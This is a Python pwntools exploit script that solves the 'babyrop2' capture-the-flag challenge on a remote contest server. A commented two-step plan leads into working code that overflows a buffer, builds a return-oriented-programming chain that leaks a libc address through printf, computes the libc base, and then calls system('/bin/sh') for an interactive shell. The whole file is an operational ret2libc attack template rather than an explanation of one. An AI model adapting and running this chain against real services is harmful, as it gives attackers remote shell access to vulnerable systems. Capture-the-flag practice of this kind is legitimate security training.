
from pwn import *

if __name__ == "__main__":
		"""
		1st Step: "A"*40 + printf("%s", got_libc_start_main) + main
		this 1st step will leak the address of printf 
		so we got the offset !
		2nd Step: "A"*40 + system("/bin/sh")
		"""
		#p = process('./babyrop2')
		p = remote('problem.harekaze.com', 20005)
		libc = ELF('libc.so.6')
		elf = ELF('babyrop2')
		print("[*]", p.recvrepeat(1))
		print(hex(elf.symbols.main))
		ret = 0x00000000004006cb
		pop_rdi = 0x0000000000400733
		pop_rsi_r15 = 0x0000000000400731
		string = 0x400770
		printf_plt = 0x4004f0
		libc_start_main = 0x601028
		printf_payload = p64(pop_rdi) + p64(string) + p64(pop_rsi_r15) + p64(libc_start_main) + p64(libc_start_main) + p64(printf_plt)
		p.send("A"*40 + printf_payload + p64(elf.symbols.main))
		dump = p.recvrepeat(2)
		print(hexdump(dump))
		leaked_addr_libc_start_main = u64(dump[0x5f:0x65] + "\x00\x00")
		libc.address = leaked_addr_libc_start_main - libc.symbols['__libc_start_main']
		print(hex(libc.address))
		binsh_addr = next(libc.search("/bin/sh"))
		p.send("A"*40 + p64(pop_rdi) + p64(binsh_addr) + p64(libc.symbols['system']))
		p.interactive()
